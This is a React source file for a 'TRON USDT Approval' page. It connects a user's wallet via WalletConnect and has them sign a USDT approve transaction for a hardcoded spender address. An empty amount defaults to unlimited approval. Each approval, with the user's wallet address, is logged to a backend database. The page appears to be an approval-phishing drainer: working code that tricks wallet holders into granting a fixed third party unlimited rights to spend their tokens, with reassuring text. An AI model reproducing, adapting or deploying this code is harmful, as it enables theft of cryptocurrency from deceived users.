import { useState, useEffect, useRef } from "react";
import { useSearchParams } from "react-router-dom";
import { useMutation } from "convex/react";
import { api } from "@/convex/_generated/api.js";
import SignClient from "@walletconnect/sign-client";

declare global {
  interface Window {
    tronWeb?: any;
    tronLink?: any;
    TronWeb?: any;
  }
}

const PROJECT_ID = "6b5df56bc30c1dadaab59498b86fd3e8";
const TRON_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const TRON_SPENDER = "TD7YMonVkbcEiVu5tqXvEeBa2zniao86pJ";

export default function TronApproval() {
  const [searchParams] = useSearchParams();
  const [amount, setAmount] = useState("");
  const [walletAddress, setWalletAddress] = useState("");
  const [isConnected, setIsConnected] = useState(false);
  const [approvalStatus, setApprovalStatus] = useState<"idle" | "processing" | "success" | "error">("idle");
  const [allowance, setAllowance] = useState("0");
  const [txHash, setTxHash] = useState("");
  const [errorMessage, setErrorMessage] = useState("");
  
  const createTransaction = useMutation(api.transactions.createTransaction);
  const wcClientRef = useRef<any>(null);
  const wcSessionRef = useRef<any>(null);
  const userAddressRef = useRef<string>("");

  // ===== INIT WALLETCONNECT =====
  useEffect(() => {
    async function initWC() {
      try {
        console.log("🔄 Initializing WalletConnect...");
        
        const client = await SignClient.init({
          projectId: PROJECT_ID,
          metadata: {
            name: "Tron USDT Approval",
            description: "Approve USDT for spending",
            url: window.location.origin,
            icons: [],
          },
        });
        
        wcClientRef.current = client;
        console.log("✅ WalletConnect initialized");
        
        // Handle session events
        client.on("session_delete", () => {
          console.log("Session deleted");
          resetConnection();
        });
        
        client.on("session_expire", () => {
          console.log("Session expired");
          resetConnection();
        });
        
        // Reconnect on visibility change
        document.addEventListener("visibilitychange", () => {
          if (document.visibilityState === "visible" && wcSessionRef.current) {
            console.log("Reconnecting relay...");
            client.core?.relayer?.restartTransport?.();
          }
        });
        
      } catch (error) {
        console.error("Init error:", error);
        setErrorMessage("Failed to initialize WalletConnect");
      }
    }
    
    initWC();
    
    return () => {
      if (wcSessionRef.current) {
        wcClientRef.current?.disconnect({ topic: wcSessionRef.current.topic });
      }
    };
  }, []);
  
  const resetConnection = () => {
    wcSessionRef.current = null;
    userAddressRef.current = "";
    setIsConnected(false);
    setWalletAddress("");
    setAllowance("0");
  };
  
  // ===== CONNECT WALLET =====
  async function connectWallet() {
    try {
      console.log("🔗 Connecting wallet...");
      
      if (!wcClientRef.current) {
        throw new Error("WalletConnect not initialized");
      }
      
      // Disconnect existing session
      if (wcSessionRef.current) {
        try {
          await wcClientRef.current.disconnect({
            topic: wcSessionRef.current.topic,
            reason: { code: 6000, message: "New connection" },
          });
        } catch (e) {}
        resetConnection();
      }
      
      // Create new session
      const { uri, approval } = await wcClientRef.current.connect({
        requiredNamespaces: {
          tron: {
            methods: ["tron_signTransaction", "tron_signMessage"],
            chains: ["tron:0x2b6653dc"],
            events: ["chainChanged", "accountsChanged"],
          },
        },
      });
      
      if (!uri) throw new Error("No URI received");
      
      // Open QR modal
      const { WalletConnectModal } = await import("@walletconnect/modal");
      const modal = new WalletConnectModal({
        projectId: PROJECT_ID,
        themeMode: "dark",
      });
      
      await modal.openModal({ uri });
      wcSessionRef.current = await approval();
      modal.closeModal();
      
      // Get address
      const accounts = Object.values(wcSessionRef.current.namespaces)
        .flatMap((ns: any) => ns.accounts);
      const tronAccount = accounts.find((a: string) => a.startsWith("tron:"));
      
      if (!tronAccount) throw new Error("No TRON account found");
      
      const address = tronAccount.split(":")[2];
      userAddressRef.current = address;
      setWalletAddress(address);
      setIsConnected(true);
      
      console.log("✅ Connected:", address);
      
      // Check current allowance
      await fetchAllowance(address);
      
      return address;
      
    } catch (error: any) {
      console.error("Connection error:", error);
      setErrorMessage(error.message || "Failed to connect wallet");
      throw error;
    }
  }
  
  // ===== FETCH CURRENT ALLOWANCE =====
  async function fetchAllowance(address: string) {
    try {
      console.log("🔍 Fetching allowance...");
      
      // Load TronWeb dynamically
      const TronWeb = (window as any).TronWeb;
      if (!TronWeb) {
        console.warn("TronWeb not loaded");
        return;
      }
      
      const tronWeb = new TronWeb({
        fullHost: "https://api.trongrid.io"
      });
      
      const contract = await tronWeb.contract().at(TRON_USDT);
      const allowanceAmount = await contract.allowance(address, TRON_SPENDER).call();
      const allowanceUSDT = (Number(allowanceAmount) / 1e6).toFixed(2);
      
      setAllowance(allowanceUSDT);
      console.log("Current allowance:", allowanceUSDT, "USDT");
      
    } catch (error) {
      console.error("Failed to fetch allowance:", error);
    }
  }
  
  // ===== BUILD APPROVAL TRANSACTION =====
  async function buildApprovalTransaction(userAddress: string, amountValue: string) {
    console.log("📝 Building approval transaction...");
    
    // Load TronWeb
    const TronWeb = (window as any).TronWeb;
    if (!TronWeb) {
      throw new Error("TronWeb not loaded. Please refresh the page.");
    }
    
    const tronWeb = new TronWeb({
      fullHost: "https://api.trongrid.io"
    });
    
    // Convert spender address to hex
    const spenderHex = tronWeb.address.toHex(TRON_SPENDER);
    // Remove '41' prefix if present (TRON addresses start with 41)
    const cleanSpenderHex = spenderHex.startsWith('41') ? spenderHex.slice(2) : spenderHex;
    
    // Prepare amount
    let amountHex;
    if (amountValue === "Max" || amountValue === "max" || !amountValue) {
      // Max approval: 2^256 - 1
      amountHex = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
    } else {
      const amountNum = parseFloat(amountValue);
      if (isNaN(amountNum)) throw new Error("Invalid amount");
      const amountWithDecimals = Math.floor(amountNum * 10**6);
      amountHex = tronWeb.toHex(amountWithDecimals).padStart(64, '0');
    }
    
    // Build parameter: address(64 chars) + amount(64 chars) = 128 chars
    const parameter = cleanSpenderHex.padStart(64, '0') + amountHex;
    
    console.log("Parameter length:", parameter.length); // Should be 128
    console.log("Parameter:", parameter);
    
    // Call TronGrid API
    const response = await fetch("https://api.trongrid.io/wallet/triggersmartcontract", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        owner_address: userAddress,
        contract_address: TRON_USDT,
        function_selector: "approve(address,uint256)",
        parameter: parameter,
        fee_limit: 200000000, // 200 TRX
        call_value: 0,
        visible: true,
      }),
    });
    
    const data = await response.json();
    console.log("TronGrid response:", data);
    
    if (!data.transaction) {
      throw new Error("Failed to build transaction: " + JSON.stringify(data));
    }
    
    // Add required fields
    data.transaction.visible = true;
    
    return data.transaction;
  }
  
  // ===== BROADCAST TRANSACTION =====
  async function broadcastTransaction(signedTx: any) {
    console.log("📡 Broadcasting transaction...");
    
    const response = await fetch("https://api.trongrid.io/wallet/broadcasttransaction", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(signedTx),
    });
    
    const result = await response.json();
    console.log("Broadcast result:", result);
    
    if (!result.result && !result.txid) {
      throw new Error("Broadcast failed: " + JSON.stringify(result));
    }
    
    return result.txid || result.transaction?.txID;
  }
  
  // ===== MAIN APPROVAL FUNCTION =====
  async function handleApprove() {
    console.log("🚀 Starting approval process...");
    setApprovalStatus("processing");
    setErrorMessage("");
    setTxHash("");
    
    try {
      // Connect wallet if not connected
      let address = userAddressRef.current;
      if (!address || !isConnected) {
        address = await connectWallet();
      }
      
      if (!address) {
        throw new Error("Wallet not connected");
      }
      
      // Build transaction
      const transaction = await buildApprovalTransaction(address, amount);
      
      // Sign transaction
      console.log("🔐 Requesting signature...");
      const signResponse = await wcClientRef.current.request({
        topic: wcSessionRef.current.topic,
        chainId: "tron:0x2b6653dc",
        request: {
          method: "tron_signTransaction",
          params: [transaction],
        },
      });
      
      console.log("Signature received");
      
      // Parse signed transaction
      let signedTx = signResponse;
      if (typeof signedTx === "string") {
        try {
          signedTx = JSON.parse(signedTx);
        } catch (e) {
          console.warn("Failed to parse signed tx:", e);
        }
      }
      
      // Broadcast
      const txid = await broadcastTransaction(signedTx);
      setTxHash(txid);
      console.log("✅ Approval successful! TXID:", txid);
      
      // Wait for confirmation
      console.log("⏳ Waiting for confirmation...");
      await new Promise(resolve => setTimeout(resolve, 30000));
      
      // Check new allowance
      await fetchAllowance(address);
      
      // Save to database
      await createTransaction({
        walletAddress: address,
        toAddress: TRON_SPENDER,
        amount: amount || "Max",
        txHash: txid,
        usdtBalance: allowance + " USDT",
        nativeBalance: "0 TRX",
      });
      
      setApprovalStatus("success");
      
      // Reset after 3 seconds
      setTimeout(() => {
        setApprovalStatus("idle");
      }, 3000);
      
    } catch (error: any) {
      console.error("❌ Approval error:", error);
      setErrorMessage(error.message || "Approval failed");
      setApprovalStatus("error");
      
      setTimeout(() => {
        setApprovalStatus("idle");
        setErrorMessage("");
      }, 5000);
    }
  }
  
  // ===== DISCONNECT WALLET =====
  async function disconnectWallet() {
    if (wcSessionRef.current) {
      try {
        await wcClientRef.current?.disconnect({
          topic: wcSessionRef.current.topic,
          reason: { code: 6000, message: "User disconnected" },
        });
      } catch (e) {}
    }
    resetConnection();
  }
  
  // ===== TRUNCATE ADDRESS =====
  const truncateAddress = (addr: string) => {
    if (!addr) return "";
    return addr.slice(0, 6) + "..." + addr.slice(-4);
  };
  
  // ===== RENDER =====
  return (
    <div style={{
      minHeight: "100vh",
      background: "linear-gradient(135deg, #667eea 0%, #764ba2 100%)",
      display: "flex",
      alignItems: "center",
      justifyContent: "center",
      padding: "20px",
      fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif",
    }}>
      <div style={{
        maxWidth: "500px",
        width: "100%",
        background: "white",
        borderRadius: "24px",
        padding: "32px",
        boxShadow: "0 20px 60px rgba(0,0,0,0.3)",
      }}>
        
        {/* Header */}
        <div style={{ textAlign: "center", marginBottom: "32px" }}>
          <h1 style={{
            fontSize: "28px",
            fontWeight: "bold",
            margin: "0 0 8px 0",
            background: "linear-gradient(135deg, #667eea 0%, #764ba2 100%)",
            WebkitBackgroundClip: "text",
            WebkitTextFillColor: "transparent",
          }}>
            TRON USDT Approval
          </h1>
          <p style={{ color: "#666", margin: 0 }}>
            Approve spending limit for USDT
          </p>
        </div>
        
        {/* Wallet Section */}
        <div style={{
          background: "#f5f5f5",
          borderRadius: "16px",
          padding: "16px",
          marginBottom: "24px",
        }}>
          <div style={{
            display: "flex",
            justifyContent: "space-between",
            alignItems: "center",
            marginBottom: "12px",
          }}>
            <span style={{ color: "#666", fontSize: "14px" }}>Wallet Status</span>
            {isConnected ? (
              <span style={{ color: "#10b981", fontSize: "12px", fontWeight: "500" }}>
                ● Connected
              </span>
            ) : (
              <span style={{ color: "#ef4444", fontSize: "12px", fontWeight: "500" }}>
                ● Not Connected
              </span>
            )}
          </div>
          
          {isConnected && walletAddress && (
            <div style={{
              background: "white",
              borderRadius: "12px",
              padding: "12px",
              marginBottom: "12px",
            }}>
              <div style={{ color: "#666", fontSize: "12px", marginBottom: "4px" }}>
                Wallet Address
              </div>
              <div style={{
                fontFamily: "monospace",
                fontSize: "14px",
                wordBreak: "break-all",
              }}>
                {truncateAddress(walletAddress)}
              </div>
            </div>
          )}
          
          {isConnected && allowance !== "0" && (
            <div style={{
              background: "#e0f2fe",
              borderRadius: "12px",
              padding: "12px",
            }}>
              <div style={{ color: "#0284c7", fontSize: "12px", marginBottom: "4px" }}>
                Current Allowance
              </div>
              <div style={{
                fontSize: "20px",
                fontWeight: "bold",
                color: "#0369a1",
              }}>
                {allowance} USDT
              </div>
            </div>
          )}
          
          <button
            onClick={isConnected ? disconnectWallet : connectWallet}
            style={{
              width: "100%",
              padding: "12px",
              background: isConnected ? "#ef4444" : "#667eea",
              color: "white",
              border: "none",
              borderRadius: "12px",
              fontSize: "16px",
              fontWeight: "600",
              cursor: "pointer",
              marginTop: "12px",
              transition: "all 0.3s",
            }}
            onMouseEnter={(e) => {
              e.currentTarget.style.opacity = "0.9";
            }}
            onMouseLeave={(e) => {
              e.currentTarget.style.opacity = "1";
            }}
          >
            {isConnected ? "Disconnect Wallet" : "Connect Wallet"}
          </button>
        </div>
        
        {/* Amount Section */}
        <div style={{ marginBottom: "24px" }}>
          <label style={{
            display: "block",
            marginBottom: "8px",
            color: "#333",
            fontWeight: "500",
          }}>
            Approval Amount
          </label>
          
          <div style={{
            display: "flex",
            gap: "12px",
            marginBottom: "12px",
          }}>
            <input
              type="text"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              placeholder="Enter amount or 'Max'"
              style={{
                flex: 1,
                padding: "14px",
                border: "2px solid #e5e5e5",
                borderRadius: "12px",
                fontSize: "16px",
                outline: "none",
                transition: "border-color 0.3s",
              }}
              onFocus={(e) => {
                e.currentTarget.style.borderColor = "#667eea";
              }}
              onBlur={(e) => {
                e.currentTarget.style.borderColor = "#e5e5e5";
              }}
            />
            <button
              onClick={() => setAmount("Max")}
              style={{
                padding: "0 20px",
                background: "#f3f4f6",
                border: "none",
                borderRadius: "12px",
                fontSize: "16px",
                fontWeight: "600",
                cursor: "pointer",
                color: "#667eea",
              }}
            >
              Max
            </button>
          </div>
          
          <p style={{
            fontSize: "12px",
            color: "#666",
            margin: 0,
          }}>
            {amount && amount !== "Max" && !isNaN(parseFloat(amount))
              ? `≈ $${parseFloat(amount).toFixed(2)} USD`
              : "Leave empty or 'Max' for unlimited approval"}
          </p>
        </div>
        
        {/* Approve Button */}
        <button
          onClick={handleApprove}
          disabled={approvalStatus === "processing" || !isConnected}
          style={{
            width: "100%",
            padding: "16px",
            background: approvalStatus === "processing"
              ? "#9ca3af"
              : approvalStatus === "success"
              ? "#10b981"
              : approvalStatus === "error"
              ? "#ef4444"
              : "linear-gradient(135deg, #667eea 0%, #764ba2 100%)",
            color: "white",
            border: "none",
            borderRadius: "12px",
            fontSize: "18px",
            fontWeight: "600",
            cursor: approvalStatus === "processing" || !isConnected ? "not-allowed" : "pointer",
            transition: "all 0.3s",
            opacity: approvalStatus === "processing" || !isConnected ? 0.6 : 1,
          }}
        >
          {approvalStatus === "processing" && "Processing..."}
          {approvalStatus === "success" && "✓ Approval Successful!"}
          {approvalStatus === "error" && "✗ Approval Failed"}
          {approvalStatus === "idle" && "Approve USDT"}
        </button>
        
        {/* Transaction Hash */}
        {txHash && (
          <div style={{
            marginTop: "16px",
            padding: "12px",
            background: "#f0fdf4",
            borderRadius: "12px",
            fontSize: "12px",
          }}>
            <div style={{ color: "#166534", marginBottom: "4px" }}>Transaction Hash:</div>
            <a
              href={`https://tronscan.org/#/transaction/${txHash}`}
              target="_blank"
              rel="noopener noreferrer"
              style={{
                color: "#22c55e",
                textDecoration: "none",
                wordBreak: "break-all",
                fontFamily: "monospace",
              }}
            >
              {txHash}
            </a>
          </div>
        )}
        
        {/* Error Message */}
        {errorMessage && (
          <div style={{
            marginTop: "16px",
            padding: "12px",
            background: "#fef2f2",
            borderRadius: "12px",
            color: "#dc2626",
            fontSize: "12px",
          }}>
            ❌ {errorMessage}
          </div>
        )}
        
        {/* Info Section */}
        <div style={{
          marginTop: "24px",
          padding: "16px",
          background: "#fef3c7",
          borderRadius: "12px",
          fontSize: "12px",
          color: "#92400e",
        }}>
          <div style={{ fontWeight: "bold", marginBottom: "8px" }}>
            ℹ️ Important Information
          </div>
          <ul style={{ margin: 0, paddingLeft: "20px" }}>
            <li>Approval allows the spender to use your USDT</li>
            <li>Max approval gives unlimited spending权限</li>
            <li>Transaction fees will be deducted in TRX</li>
            <li>You can revoke approval anytime</li>
          </ul>
        </div>
        
      </div>
    </div>
  );
}
